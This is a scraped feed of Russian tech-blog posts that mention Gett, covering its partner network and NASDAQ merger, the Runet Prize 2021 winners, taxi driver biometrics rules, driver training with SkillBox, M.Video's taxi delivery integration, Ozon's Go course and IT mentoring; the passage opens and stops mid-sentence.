GTM) Gett предлагает выбор из более чем 2000 поставщиков транспортных услуг различных видов, включая агрегаторы такси, корпоративные парки и сервисы по аренде автомобилей с водителем. Всё это собрано на одной платформе и формирует глобальную транспортную сеть. Технология помогает экономить время и деньги корпоративных клиентов за счет централизованного управления всеми расходами на наземный транспорт и оптимизации всей цепочки: от бронирования и совершения поездок до выставления счетов и аналитики.Напомним, ранее, 10 ноября 2021, Gett, а также Rosecliff Acquisition Corp I (NASDAQ: RCLF)  объявили о заключении окончательного соглашения по объединению бизнеса. После завершения объединения бизнеса, новая компания будет функционировать под названием Gett и торговаться под тикером «GETT» на бирже NASDAQ.Подробности о расширенииКоличество партнеров выросло в два раза по сравнению с 2020 годом благодаря общему оживлению рынка и интересу к проекту. Сейчас в базе доступных для бронирования автомобилей - свыше 3,2 транспортных средств. Партнеры - такие известные сервисы, как Lyft, Ola, Excel, Carey, Green Tomato, Curb, Careem и Cabify.Дэйв Вайсэр, генеральный директор и сооснователь Gett: “Эта новость подтверждает лидирующие позиции Gett в категории корпоративного наземного транспорта, а также способность компании построить первую в своем роде глобальную транспортную сеть. Партнеры ценят нас за возможность дополнительного роста, а клиенты приходят к нам за высоким качеством обслуживания по доступной цене”.Software-платформа Gett объединяет все виды поставщиков транспортных услуг, включая агрегаторы такси, корпоративные парки и сервисы по заказу премиальных автомобилей с водителем.", {"day": "9", "month": "декабря", "time": "20:14"}, {"rate": 2, "views": 622}], ["7 декабря состоялась церемония награждения лауреатов премии Рунета 2021 года. В этом году на премию было подано 1097 работ за вклад в развитие российского сегмента сети интернет в девять основных и четыре специальные номинации. Финалистами конкурса в каждой номинации стали по 10 организаций. \n\r\nЛауреатами премии Рунета 2021 стали 52 компании и 3 персоны. Причем раньше организаторы (Российская ассоциация электронных коммуникаций — РАЭК) награждали несколько лучших представителей в каждой из номинации, по мнению экспертного сообщества. В этом году они обратились к помощи искусственного интеллекта и добавили еще одного лауреата, который выбирался именно по мнению ИИ. \n\r\nНоминация «Государство и Общество», победители:\n\n\n Благотворительный фонд «Подари жизнь»;\n АНО «Диалог»;\n Правительство Москвы, проект Цифровая экосистема Москвы;\n ФНС России;\n Программа «Пушкинская карта» / АО «Почта Банк».\n\r\nНоминация «СМИ и Массовые коммуникации»: \n\n\n Телеканал 360;\n Медиахолдинг Independent Media;\n АО «Коммерсантъ».\n\r\nНоминация “Образование и Кадры”:\n\n\n Правительство Москвы, проект “Московская электронная школа” (МЭШ);\n Проект программы “Сбер для детей и родителей” совместно с Rambler&Co;\n ООО “Цифровое образование”, проект ИКОП “Сферум”;\n Образовательная платформа “Нетология” (ООО “Нетология”);\n Компания Samsung Electronics.\n\r\nНоминация «Наука, технологии и инновации»:\n\n\n Gett;\n Иннотех;\n Skillbox ;\n Промобот;\n SberDevices ;\n Билайн.\n\r\nНоминация “Культурные проекты в Сети”:\n\n\n Общественное телевидение России;\n Проект “Путь героя” информационного агентства ТАСС и киностудии “Союзмультфильм”;\n Эмпатия Манучи (авторский канал Манучарова Вячеслава);\n Федеральное государственное бюджетное учреждение культуры «Всероссийское музейное объединение “Государственная Третьяковская галерея”.\n\r\nНоминация “Игровая индустрия и киберспорт”:\n\n\n Федерация компьютерного спорта города Москвы — “Московский Киберспорт”;\n ESforce Holding;\n Cybersport.Metaratings;\n MetaMMA;\n Goose Gaming.\n\r\nНоминация “Креативные индустрии”:\n\n\n Ассоциация профессиональных участников творческой экономики “Федерация креативных индустрий”;\n ООО “Гэллэри Сервис”;\n Vinci Agency;\n Проект по веб-инклюзии (Студия Артемия Лебедева).\n\r\nНоминация “Здоровье и медицина”:\n\n\n Здоровье.ру;\n Проект „Здоровое Питание“ (Федеральная служба по надзору в сфере защиты прав потребителей и благополучия человека);\n Правительство Москвы, проект по использованию технологий компьютерного зрения на базе искусственного интеллекта (ИИ) для анализа медицинских изображений.\n\r\nНоминация “Экономика и бизнес”:\n\n\n СберМаркет;\n Balance Platform;\n Московская биржа;\n Метарейтинг.\n\r\nНоминация “За развитие среднего и малого бизнеса в Рунете”: \n\n\n Портал для предпринимателей Smallbusiness.ru;\n ПАО „МТС“, проект “Знаем лично”;\n Банк ВТБ ПАО, проект интернет-банк.\n\r\nНоминация “#СЧАСТЬЕЕСТЬ”: Автономная некоммерческая организация по развитию экологических, социальных и патриотических проектов „Сад Памяти“.\n\r\nНоминация “Развитие внутреннего туризма”: \n\n\n Проект Oh My Град;\n Россия: 85 приключений, проект онлайн-медиа Russia Beyond, входящее в телесеть RT;\n АНО “Проектный офис по развитию туризма и гостеприимства Москвы” Туристический сервис RUSSPASS;\n Комитет по туризму города Москвы, проект Discovermoscow.com.\n\r\nНоминация “Открытые коммуникации”:\n\n\n Мэр Вологды — Сергей Воропанов;\n Правительство Тульской области;\n Федеральное агентство по туризму, портал Russia.travel.\n\r\nНародном голосовании премии Рунета 2021 были выбраны такие лауреаты: \n\n\n в номинации “КТО”: Дмитрий Спиридонов;\n в номинации “ЧТО”: Forza;\n в номинациилучший цифровой регион (номинация “Где”): город Москва.\n\r\nВдобавок за персональный многолетний вклад в развитие интернет-отрасли награду премия Рунета 2021 получил экс-глава Роспечати Михаил Сеславинский. \n\n\n\r\nВ этом году Хабр также подавал заявку на участие в премии Рунета в номинации «Креативные индустрии». Заявлен был наш конкурс «Технотекст». Мы не стали лауреатами, но вошли сперва в шорт-лист, а затем и в число финалистов рядом с очень серьёзными соперниками. Описание заявки Хабра можно посмотреть на странице сайта конкурса.", {"day": "8", "month": "декабря", "time": "09:30"}, {"rate": 6, "views": 2300}], ["Правительство разрешило сервисам собирать биометрические данные водителей каршеринга и такси для их идентификации. Представители рынка считают, что это снизит риски использования поддельных документов и данных.Такси и каршеринг внесли в перечень нефинансовых организаций, которые имеют право собирать и обрабатывать персональные биометрические данные водителей для их идентификации и аутентификации. Постановление вступит в силу 1 марта 2022 года и будет действовать шесть лет.В Минцифры заверили, что в постановлении правительства описана ситуация, когда владельцы такси или каршеринга по собственной инициативе используют коммерческие биометрические системы. Они смогут предоставлять услуги по биометрической идентификации только при условии наличия аккредитации на предмет соответствия требованиям по информационной безопасности и хранению биометрических персональных данных. Ее будет проводить Минцифры с 2022 года. В Яндексе отметили, что компания рассмотрит возможность применения биометрии для своих сервисов такси и каршеринга. В BelkaCar считают, что потенциально использование биометрии может повысить качество верификации пользователей и упростить процесс регистрации, но также и затруднить этот процесс. Гендиректор Gett в России Анатолий Сморгонский заявил, что у компании в Москве уже более двух месяцев работает система КИС «АРТ». Когда водитель регистрируется в ней, он предоставляет «целый ряд данных, позволяющих идентифицировать» его. Минцифры выступило с предложением собирать биометрию (слепков лица и голосовых материалов) водителей такси и пользователей каршеринга в августе. Тогда же правительство задумалось о вводе стандартов сбора слепков лиц и голосов россиян в коммерческих биометрических системах. Пока требования выполняют только те, кто заносит сведения в единую биометрическую систему. Компаниям-сборщикам данных придется согласовывать с министерством софт, модель и тип оборудования для сбора и хранения данных. Оно должно быть сертифицировано ФСТЭК, а профильный сотрудник обязан подтверждать свои полномочия усиленной квалифицированной электронной подписью. Власти решили регламентировать и сам процесс сбора данных, начиная от формата и заканчивая постановкой кадра.Сообщалось, что компаниям с долей иностранного участия более 49 % и капиталом менее 500 миллионов рублей запретят собирать и использовать биометрические данные российских граждан. Если требование вступит в силу, то работать с биометрическими данными не смогут сервисы каршеринга, Avito и AirBnb, «Тинькофф-банк» и экосистемы Яндекса.В сентябре МВД рассказало о создании централизованного банка биометрических данных россиян и находящихся в стране иностранцев. Система будет запущена в 2023 году. Она будет хранить все ранее собранные базы данных с биометрическими данными граждан от РТК и банков, включая слепки лица и голосовые материалы, а также дактилоскопическую и фоноскопическую информацию граждан, данные из лабораторий ДНК-анализа и систем проверки по оперативно-справочным, разыскным и криминалистическим учетам органов внутренних дел и спецслужб.Между тем президент InfoWatch Наталья Касперская посоветовала жителям России не сдавать биометрические данные, так как пока нет понимания, как их будут защищать.", {"day": "27", "month": "октября", "time": "13:53"}, {"rate": 7, "views": 1300}], ["С начала пандемии популярность онлайн-образования активно растет. Только за несколько первых месяцев прошлого года количество учащихся в онлайне выросло в 2,5 раза. Изменения не только качественные, но и количественные. В октябре 2020 года оборот в отрасли увеличился на 110% по сравнению с прошлым годом. Формат занятий и обучения в целом модифицируются под самые разные запросы. Несмотря на то, что традиционные лекции все еще наиболее распространенный формат даже в интернете, постепенно становятся популярными и другие форматы.\n\r\nНедавно стало известно о запуске цифрового центра обучения водителей бизнес-класса, который запустили сервис такси Gett и образовательная платформа SkillBox. Подробности — под катом.\n \r\nПо мнению партнеров, онлайн-обучение сможет увеличить качество работы водителей на треть уже к марту 2022 года. Более того, эксперты считают, что подобный подход сможет оказать положительное влияние на сервис рынка услуг такси в РФ.\n\nКак работает центр \r\nС 2014 года Gett проводит очную аттестацию и обучение водителей премиального класса. Что касается онлайн-обучения, то теоретическая подготовка перейдет в цифровой формат на образовательной платформе SkillBox. Водители, которые хотели бы подключиться к премиальным классам Gett, должны пройти восемь обучающих видеоуроков на следующие темы: стандарты качества сервиса, дресс-код и внешний вид водителя, система оценок пассажирами, контроль качества работы в Gett, систему основных показателей работы водителя (оценка и отклик на заказы), систему контроля качества работы и предоставление дополнительных услуг (например, тарифы «Бизнес Детский» и «Трезвый водитель»). Обучение, как и прежде, будет бесплатным.\n\nКак зарегистрироваться \r\nДля того, чтобы получить доступ к образовательному сервису водителям нужно пройти регистрацию на платформе Gett. После того они получают доступ к урокам. Водители смогут знакомиться с материалами в удобное им время. После прохождения всего курса «студенты» смогут записаться на очное тестирование в Центр подготовки водителей. Первый этап аттестации включает экзамен на знание ПДД и города, а также знание стандартов качества Gett. На втором этапе кандидатам предстоит собеседование со специалистом Центра и сдача финального экзамена на знание материала.\n\r\nПо словам генерального директора Gett в России Анатолия Сморгонского: «Пандемия стала стимулом для цифровизации образования во всем мире. Когда мы осознали, что наш центр по подготовке водителей необходимо переводить в онлайн, мы искали надежного партнера, имеющего удобную платформу и доказавшего свою экспертизу в EdTech. Наша совместная программа со SkillBox призвана также напомнить, что водитель — это социально значимая профессия, к которой предъявляются высокие требования. Мы ценим лояльность наших пользователей и стараемся повышать стандарты качества и предоставляемого сервиса».\n\r\n«Автоматизация обучения — это тренд текущих дней. Мы рады, что такие крупные игроки на рынке, как Gett, уже оценили удобство дистанционного образования и ответственно подходят к переподготовке своих водителей-партнеров. Надеемся, что обе стороны оценят удобство этой инициативы, и наш совместный проект сделает сервис такси ещё комфортнее и безопаснее», — Наталия Журавлева, руководитель направления корпоративных продаж SkillBox.", {"day": "1", "month": "октября", "time": "11:51"}, {"rate": 3, "views": 802}], ["Использование такси для доставки товаров — это «новая нормальность». И все потому, что 2020 год подтолкнул ритейлеров к расширению мобильности и стимулировал развитие способов доставки, а уж тем более быстрых. Таксисты уже доставили более полумиллиона заказов из магазинов М.Видео и Эльдорадо, но чтобы новый сервис был качественным, нам пришлось серьезно поработать. \n\r\nСегодня мы рассказываем о том, как начали дружить с таксистами, как нас пытались обмануть мошенники, почему фен проехал на такси 200 километров и какой опыт получил департамент по итогам разработки.\n\n\n\r\nВ марте 2020 года, когда значительная часть розницы закрылась и продажи стали проседать, использование такси стало одним из тех решений, которые позволили поддержать дистанционную торговлю. Кстати, таксисты тоже были «только за», люди сидели по домам и количество поездок в городах сильно сократилось. Доставки стали осуществляться не только из магазинов, но и со складов, в результате агрегаторы такси глубоко интегрировались в нашу систему логистики.\n\r\nВажно, что мы сразу решили не наращивать свой собственный автопарк для нашей экспресс-доставки, понимая, что заниматься развитием цифрового продукта гораздо интереснее, чем управлять парком автомобилей, курьеров. Мы задумали подключить всех, до кого сможем дотянуться. А для этого нам нужен был оркестрирующий продукт, который являлся бы промежуточной площадкой-интегратором между желанием клиента быстрой доставки и таксистом.\n\nРабота с таксопарками\r\nДля взаимодействия со службами такси нужно было разработать специальный инструментарий. Все начиналось достаточно просто. Агрегаторы используют открытые API, чтобы интегрировать свои сервисы с любыми другими клиентскими системами. Мы запросили доступ, и наши разработчики приступили к созданию модуля.\n\n\n\r\nВ начале мы интегрировались с Gett, который как раз вводил в эксплуатацию новое API специально для доставок через такси, и мы стали одними из первых его партнеров. Практически ежедневно шло взаимодействие и общение разработчиков, аналитиков и тестировщиков обеих сторон интеграции — мы находили баги друг у друга и их исправляли. \n\r\nКиллер-фичей API Gett является возможность менять статусы у доставок в тестовой среде без опасения, что настоящий таксист выедет за мешком айфонов в один из наших магазинов. Это очень помогло нам и облегчило тестирование в разы. Также нельзя не отметить качество документации — это мощный катализатор любой интеграции, а у Gett она оставляет только положительные эмоции. \n\r\nСтатусная модель доставок в Gett подходила к нашей бизнес-логике, и мы переняли её практически без изменений. А сейчас к ней приводим статусы доставок других наших партнеров, провайдеров такси. Кроме того, Gett через API отдаёт ссылки на фотографии таксиста, который приедет к нам за товаром — это приятный дополнительный признак для опознания ожидаемого нами водителя.\n\nОдин провайдер хорошо, а чем больше, тем лучше!\r\nВторым нашим партнёром стала компания CallToVisit и её b2b-сервис по организации перевозок. CallToVisit — это агрегатор провайдеров такси. В результате заказа такси через CallToVisit к нам может приехать машина от Яндекс Go, Gett, Ситимобил, Maxim и других сервисов. \n\r\nВ отличии от Gett, CallToVisit API использует для формата запроса Form Data вместо Json. Не беда! В кратчайшие сроки мы написали необходимый адаптер и ввели его в эксплуатацию. Сначала мы использовали API для обычных поездок на такси, но затем CallToVisit выпустили API специально для доставок. CallToVisit сейчас и в процессе интеграции оказывали нам полную техническую поддержку с быстрыми ответами на наши вопросы, за что мы им очень благодарны.\n\r\nПочему мы сразу не выбрали только CallToVisit и зачем нам другие интеграции? Тут есть пара моментов: 1 — не складывайте все яйца в одну корзину (отказоустойчивость), 2 — интеграция с провайдерами напрямую также даёт доступ к их уникальным фичам и возможностям. Поэтому между или мы выбираем И!\n\r\nБуквально в эти дни мы вводим в эксплуатацию нашего нового партнёра — провайдера такси Яндекс Go. И у него также своё API со своими особенностями. Богатая функциональность, подробная документация, оперативная тех.поддержка и приобретенный ранее опыт сделали процесс интеграции легким и невероятно быстрым. Всеми колёсами едем в прод с ветерком!\n\r\nЕсли смотреть на вопрос с технической стороны, то интеграция выглядит следующим образом:\n\n\n\r\nДля каждого партнера у нас есть свой микросервис-адаптер к API провайдера такси.\n\n\nАдаптер читает сообщения с запросами на создание доставки из топика Kafka.\nДоставка может быть исполнена сейчас (экспресс) или в будущем (отложенная). Если экспресс, то выполняем незамедлительно, иначе сохраняем в БД и запустим позже.\nКогда приходит время выполнить доставку, то адаптер при необходимости собирает для запроса дополнительную информацию (например, таймзону магазина или доступный тариф провайдера) и делает запрос на создание доставки в API.\nВ ответе от провайдера Адаптер получает, в общем случае, идентификатор доставки провайдера и её статус.\nАдаптер делает запись в своей БД о новой исполняющейся доставке.\nРаз в N единиц времени просыпается cronJob, который просит Адаптер сходить в API провайдера и получить последние изменения по доставке — статус, информацию о водителе, предполагаемую или финальную цену поездки и т.п.\nЕсли Адаптер видит, что информация по доставке изменилась, то он отправляет сообщение с обновлениями в топик Kafka и также сохраняет их у себя в БД.\nКогда доставка изменяет свой статус на финальный, то это значит, что поездка закончена, и Адаптер удаляет её из своей БД\n\r\nСами доставки мы храним недалеко от информации по заказам — прямо в нашей системе исполнения заказов. При необходимости доставки через такси она запрашивает у логистической системы список и приоритет доступных провайдеров такси по координатом магазина и клиента, а также по перевозимым товарам. Далее происходит выбор из списка самого приоритетного провайдера, формирование и отправка сообщения в топик Kafka для его адаптера. \n\r\nПосле этого система исполнения заказов читает из Kafka обновления по доставкам и сохраняет их. Если доставка долго находится в ожидании, то система исполнения заказов отменяет её через адаптер ранее выбранного провайдера. После этого происходит выбор следующего по приоритету партнёра и попытка создания поездки через него.\n\r\nВ процессе доставки товара через такси с системой исполнения заказов взаимодействуют наши фронтальные системы (bff). Они получают информацию по заказу и проверяют статус его доставки. Это позволяет отобразить в едином рабочем веб-интерфейсе сотрудника магазина все данные в удобном виде с необходимым набором возможных действий.\n\r\nСейчас на очереди доставка ко времени, оплата у порога, пешие курьеры, доставка из магазина в магазин, переход на callback-модель получения обновлений о доставке, переезд системы исполнения заказов в Camunda и много другого, что выведет сервис на новый уровень комфорта для наших клиентов.\n\nТехническая сторона вопроса\r\nКак внешний заказчик, фактически на каждую доставку мы вызывали такси с доставкой до подъезда за 2 часа. После первых обкаток возникли сложности, которые потребовали более тонкой настройки инструмента.\n\n1. Качественная настройка географии. Мы должны были определить, откуда и куда нужно везти товар. Например, когда клиент находится по одному адресу и указывает доставку в иное место, а склад находился в другом городе, наши собственные системы должны тщательно проработать логистику, чтобы менеджерам не приходилось вручную вылавливать казусы с географией.\n\n2. Распределение по зонам доставки. Классифицировать потребовалось и сами заказы. Для такси необходимо было определить свои зоны доставки от каждого склада и магазина, чтобы не обогащать излишне службы такси. Сейчас, когда клиент указывает в приложении точку, в которую нужно доставить товар, бэк-офисная система определяет склад, с которого этот товар \r\nудобнее, выгоднее и быстрее будет привезти на такси.\n\n3. Максимальный комфорт для клиента. Пришлось подумать о более глубокой автоматизации, чтобы процесс доставки работал без участия клиента. \n\n4. Упрощение взаимодействия таксиста и склада. Чтобы не терять время на получение товара, нам пришлось разработать дополнительный функционал к системе оформления заказов. Цель была в том, чтобы таксист получал номер заказа, а на складе для него уже были правильно оформленные документы. Мы, конечно, хотели бы полностью отказаться от бумажных документов, но пока не все наши партнеры к этому готовы. Для отгрузки используются накладные, а клиент должен получить гарантийный талон и чек о покупке. \n\nОшибки, проблемы и их решения\r\nКонечно, на этом пути были и подводные камни. Один раз, еще на раннем этапе одному из покупателей, который оформил заказ в московском магазине, потребовалась доставка во Владимирскую область.\n\r\nВ результате фен прокатился пару сотен километров на такси, снизив финансовые результаты проекта (хотя лишь временно), а мы получили важный опыт и расширили работу алгоритмов. \r\nБывали ситуации, когда курьер, получив отличный телевизор, айфон или ноутбук, исчезал с радаров. Такие случаи были единичными, и решались в правовом поле. Конечно, заказ отправлялся повторно, а к таксисту применялись логичные санкции. Благо, мы знаем, кто он, на какой машине, и когда его последний раз «видели» сервисы агрегатора. \n\r\nПоскольку в нашей стране живут очень изобретательные люди, некоторые пытались обмануть систему и отменяли заказ, когда водитель уже вручал им товар. Таксист — лишь наш партнер, он не может моментально отследить изменение статуса. Такие кейсы отрабатывала сервисная служба, которая связывалась с клиентом, объясняла противоправность его действий. В 99% случаев люди понимали, что их хитроумный замысел раскрыт, и оплачивали товар. \n\nРазвиваем сервис — развиваем логику\r\nНа время пандемии сервис доставки на такси был бесплатный, а сейчас стоимость определяется исходя из цены покупки и расстояния до клиента. Чем дороже товар — тем выгоднее доставка (от 1 до 399 рублей). Пользователь видит варианты доставки при оформлении и может выбрать службу такси, если ему больше нравится этот вариант.\n\n\n\r\nНовый сервис улучшил нашу бизнес-логику. И дело не только в том, что мы сделали доставку комфортнее для покупателей. Сам сервис работает корректно и в режиме реального времени позволяет заказать доставку на сайте, отследить ее выполнение и оставить отзыв. \n\r\nПри этом мы видим, что решение об интеграции было правильное, так как количество подобных доставок постоянно растет. Более того, наша архитектура решения с экспресс-доставкой обеспечивает гораздо более высокую возможность, нежели потребность со стороны клиента. \n\r\nНашего запаса прочности хватит, чтобы увеличить кол-во поездок минимум в 10 раз, и это без потери качества и изменений в работе алгоритмов. \n\n\n\r\nБольшая часть заказов конечно приходится на столицы, но что для нас важно, что мы сделали из каждого нашего магазина — даркстор. Это означает, что в каждом городе присутствия можно получить любой товар, который влезет в автомобиль, за 2 часа. \n\nНовый продуктовый подход\r\nИнтеграция сервисов такси достаточно глубоко изменила всю парадигму нашей работы. Пандемия вынужденно ускорила переход с проектного на продуктовый подход. Раньше, чтобы разработать что-то подобное, мы нарисовали бы HLD, несколько месяцев планировали доработки во всех системах и в лучшем случае через полгода-год запустили проект сразу со всеми доработками. Но в марте 2020, когда у нас закрылись многие магазины, на такой путь времени не было. \n\n\n\nВ результате мы пошли следующим путем:\n\n\nЗапустили mvp в считанные дни: оформление доставок на такси вручную, чеки формировались сотрудником в магазине на обычной кассе, ручная обработка возвратов в магазин от таксиста и тд. Также вручную выполнялась выдача заказов на парковке сотрудниками магазина (М.Курьер)\nАвтоматизировали выдачу заказов М.Курьер: сотрудник в веб-приложении выполнял выдачу, клиент подтверждал выдачу смс-кодом, автоматически формировался чек.\nАвтоматизировали оформление доставки на такси для магазина: выполнили интеграцию с Gett, оформление доставки выполняется сотрудником в нашей системе по имеющимся в системе данным, не нужно переносить данные в личный кабинет агрегатора такси.\nПодключили еще одного агрегатора — C2V\nАвтоматизировали оформление экспресс-доставки для клиента: теперь клиент вводит только адрес доставки и система автоматически выбирает магазин из которого будет выполняться доставка по набору критериев.\nЗапустили функционал «гибкой» цены экспресс-доставки: цена может зависеть от набора критериев: стоимости заказа, расстояния до клиента и т.д.\n\nТворческие планы\r\nСегодня описанная нами выше функциональность доступна только на сайте, но это лишь потому, что совсем скоро ожидается ее появление в мобильном приложении в формате «выхода на следующий уровень». Наша цель — 100% попадание в слот, обещанный клиенту. Для этого мы сфокусировались на развитии back-платформы, предельно «причесали» процессы и уже в этом году наши клиенты получат возможность сделать это на любом фронте! \n\r\nСамое главное позади — мы собрали работоспособную команду, реализовали архитектуру, которая сделала этот сервис масштабируемым, способным самостоятельно обрабатывать любые известные нам запросы, возникающие на пути доставки заказа клиенту с минимальным участием человека. Остались приятные хлопоты — интегрировать сервис во фронты. Следите за новостями!\n\nP.S. Хотите работать в нашей команде над интересными проектами? Добро пожаловать на борт!", {"day": "9", "month": "июля", "time": "10:55"}, {"rate": 30, "views": 5500}], ["Привет, меня зовут Слава Вершинин. В марте 2021 года Ozon запустил проект Go to Ozon — бесплатный курс по разработке на языке Go для middle-программистов. В этом посте — о том, почему мы решили запустить такой проект, какие он дает плюсы, причем тут мой брат-близнец, а также немного о смысле жизни. Но главное, если вы давно задумываетесь о том, чтобы научиться программировать на Go, возможно, этот курс был создан специально для вас. \n\n\r\nЕсли вы начнете изучать вакансии, то легко убедитесь в том, что «гошники» просто закончились. Спрос на эту экспертизу растет гораздо быстрее, чем появляются люди, которые уже знают Go и при этом готовы сменить работу. В такой ситуации крупным компаниям ничего не остается кроме самостоятельной подготовки кадров.\n\r\nДа, можно пойти длинным путем — найти талантливых студентов, начать адаптировать их в свою среду, пригласить интернами и так далее. Но в этом году мы с коллегами решили проверить гипотезу о том, можно ли взять крутого специалиста, например, уже владеющего С++, Python или каким-то другим языком и за месяц обучить его Go. Курс с первыми студентами уже завершился — их оказалось 23, мы с успехом подтвердили свою гипотезу и готовы продолжить наш эксперимент.\n\nБрат-близнец и учебный курс\r\nПо жизни я — человек-двигатель. Мне интересно все — от точных наук и олимпиад до самых разных видов спорта. В свое время я участвовал в соревнованиях по большому теннису, ездил на Чемпионат Европы по карате, прошел военную службу, учредил собственную некоммерческую образовательную организацию. Обожаю беговые полумарафоны, развиваю российский рынок кибербезопасности, люблю свою семью и воспитываю троих детей.\n\n\r\nЗабавно, что с началом дисциплины программирования на 2 курсе я зарекся: «Никогда не буду программистом — слишком сложно и неинтересно». Потом жизненный путь снова повернул в сторону разработки и взгляд упал под другим углом: «Если это сложно, то это интересно». В итоге — 5 лет в сфере информационной безопасности, 2 года работы в Acronis, обучение студентов МГТУ им. Баумана разработке, собственные образовательные проекты. \n\r\nИ вся эта инициатива с обучением началась с одного забавного случая. У меня есть брат-близнец. И, конечно, первый вопрос, который появляется в голове: «Вы когда-нибудь пробовали кого-нибудь разыграть?» Да, преподавателя в институте. На зачете. Тот, конечно же, раскусил затею и попросил пригласить брата ответить на свой зачет самостоятельно. В тот момент мне стало ясно: учиться лучше самому. И если бы учебный процесс был интересным, актуальным и доступным, сделать это было бы намного проще. \n\r\nВозможно, именно этот случай и стал отправной точкой для того, чтобы запустить многие проекты в сфере образования, в том числе — создать школу Go. Когда мы составляли план обучения, я каждый раз думал: каким мне хотелось бы видеть его для себя. И вот несколько плюсов, которые подкупают своей актуальностью:\n\n\nзанятия бесплатные\nучеба 2 раза в неделю по будням вечером после работы\n в обучении учитываем, что вы уже владеете другим языком, и не топчемся на месте\n курс продолжается всего месяц\nпо его итогам вы сможете программировать на Go!\nпосле обучения вы ничего никому не должны\n\r\nПоскольку это курс от Ozon, в основе программы обучения лежит технологический стек компании, который совпадает со стеками многих других крупных российских IT-компаний. Выпускники курса учатся разрабатывать highload-сервисы, элементы микросервисной архитектурой и лучшим практикам работы с хранилищами данных.\n\nЗачем это нужно?\r\nШкола Go создана для того, чтобы переобучать людей, расширять их знания путем добавления инструментов, позволяющих решать ряд задач быстрее. Я и эксперты курса Игорь Аскаров и Миша Кабищев делятся со студентами лучшими практиками, развивая российский хайтек. \n\r\nЯ мечтаю сделать российское образование конкурентным на международном рынке. Именно поэтому сейчас работаю без выходных по 16 часов — как разработчик, методист, куратор и преподаватель. Верю в успех команды, а они верят в меня. Так и живем. \n\r\nС Игорем Аскаровым и Мишей Кабищевым мы заложили в месячный курс все основные элементы и приемы, которые требуются сегодня от специалистов. Игорь занимался разработкой больших интернет-проектов, а в Ozon отвечает за фреймворки, базы данных, сети и инфраструктуру. У Миши тоже большой опыт — до работы в Ozon он участвовал в создании Lingualeo, Juno, Gett, а сейчас руководит разработкой платформы, чтобы наши разработчики делали свою работу быстрее и эффективнее. \n\r\nЧто касается Ozon, тут все предельно просто. Как и другим крупным ИТ-фирмам, компании просто не хватает разработчиков на Go! Выгода для компании в том, что по окончанию курса каждый выпускник получит свой оффер от Ozon — то есть сможет прийти в нашу компанию работать именно с Go! Тем не менее, это необязательно. \n\r\nОбучение в школе GO Ozon можно пройти совершенно бесплатно и по окончании получить оффер от Ozon или продолжить идти «своим путем», получив дополнительные знания и умения. Для участия в программе нужно иметь опыт промышленной разработки от 2 лет и пройти собеседование, которое по сложности не уступает собеседованиям при хайринге в Ozon. Но и это само по себе — еще один интересный вызов, возможность проверить себя и пообщаться с интересными людьми.\n\nНемного о смысле жизни\r\nЗаканчиваю пост небольшой историей. Однажды студент спросил меня:\n\r\n — В чем смысл жизни?\r\n — Дать людям образование, — ответил я.\n\r\nСтудент начал спорить:\n\r\n — Нет, смысл жизни в том, чтобы испытать все меры удовольствия. А в чем смысл давать образование?\r\n — Если у человека будет образование, то у него будет все! \n\r\nТак что развивайте свои навыки, становитесь крутым специалистом и вас ждет прекрасная жизнь!", {"day": "29", "month": "июня", "time": "14:02"}, {"rate": 13, "views": 3400}], ["Привет, Хабр! Меня зовут Георгий Могелашвили. Я создатель GetMentor.dev — открытого сообщества IT-наставников из разработки, управления, продукта, аналитики и дизайна, готовых делиться с людьми своими знаниями и опытом. От других похожих площадок мы отличаемся тем, что многие наши менторы готовы помогать людям бесплатно. Зачем это им — далее в посте.На недавней встрече со SkillFactory мы обсудили с ментором и менти основные моменты: почему люди приходят к ментору, как должна проходить встреча, как к ней готовиться и чего ожидать. В качестве ментора мы позвали Игоря Полянского, Head of Global Product Analytics в Gett, а в роли менти выступал Артём Мосеев, техлид команды backend-разработки компании YCLIENTS.Кто такие ментор и ментиМентор - в переводе с латыни «наставник, учитель, мастер». По одному из древнегреческих мифов, Ментор был другом легендарного Одиссея, царя Итаки. Он был старым, мудрым и опытным человеком. Из-за возраста он не смог участвовать в Троянской войне, поэтому Одиссей, уходя в многолетний поход, доверил Ментору воспитание своего сына Телемаха и заботу о своем доме. Имя стало нарицательным и сейчас ментором называют человека, который обучает и оказывает поддержку. В русском языке аналогом слова ментор является наставник. Существуют споры, что это разные понятия, однако я придерживаюсь мнения, что наставник и ментор — тождественны и отвечают за одно и то же: помощь своему подопечному (менти) знаниями и опытом.Зачем нужна встреча с менторомКлючевой вопрос, с которого мы приступаем к любой задаче, — зачем? В случае с менти всё очевидно: получить совет от более опытного коллеги, найти решение в сложной ситуации, поделиться опытом, предупредить ошибки. Но с ментором всё не так однозначно. Игорь Полянский (ментор):У меня в голове есть разные определения менторства и того, как оно может проходить. Первое: человек приходит с конкретной задачей, чаще всего это: “Хочу стать руководителем”. В таком случае ты выступаешь как ментор стартапа. Твоя задача — помочь эту задачу решить. Второй вариант: человек хочет найти советчика, умную голову рядом. В непонятной ситуации, где у человека экспертизы нет, эта голова  предоставит экспертизу со стороны и поможет разобраться. Третий вариант я называю “бизнес-психотерапия”. К тебе приходит человек и говорит, что всё потеряно, “боже, у меня тут такие страшные вещи происходят!”. А рядом сидишь ты, ментор с холодной головой, такой бывалый морской волк, и говоришь: “Нет, чувак, не всё потеряно. Всё в порядке. Не ты первый, не ты последний”.Мне лично больше всего нравится как раз первый вариант: когда ты решаешь конкретную проблему или задачу. Это позволяет систематизировать свой собственный опыт.Последнее, но не менее важное: ты улучшаешь свою карму и поднимаешь моральный настрой.  Да, один из способов бороться с выгоранием — это перестать работать и начать учить работать других, передавать свои знания дальше по цепочке. Помимо этого, проговаривание собственного опыта помогает его систематизировать, а решение чужих задач развивает тебя как профессионала. Чего ожидать от встречиС причинами определились. Другой вопрос — ожидания. Менторство — это не волшебная палочка, которая исправит все проблемы и разом прояснит ситуацию. Это процесс, требующий усилий с обеих сторон и синхронизации ожиданий, и важно знать, что ты можешь получить от встречи с ментором, а что — нет. Артём довольно точно определил, что стоит ожидать менти от встречи.Артём Мосеев (менти):Во-первых, я жду, что рано или поздно мы сформулируем проблему и будем понимать её одинаково. Зачем мы собрались, какую проблему мы хотим решить.Я жду, что ментор сможет погрузиться в мой контекст. Он может иметь готовое решение на основе его опыта в его компании, но мой случай уникальный. И я надеюсь, что он быстро поймёт различия и применит свою экспертизу к моему случаю.Также ожидаю, что он не просто скинет инструкцию. Я хочу понимать, почему он выбрал этот вариант, из чего он выбирал, по каким критериям успешности. Готовых решений в менторстве априори быть не может. Но ментор может подсказать, в какую сторону копать, и обозначить критерии оценки успеха. Здесь нельзя давить 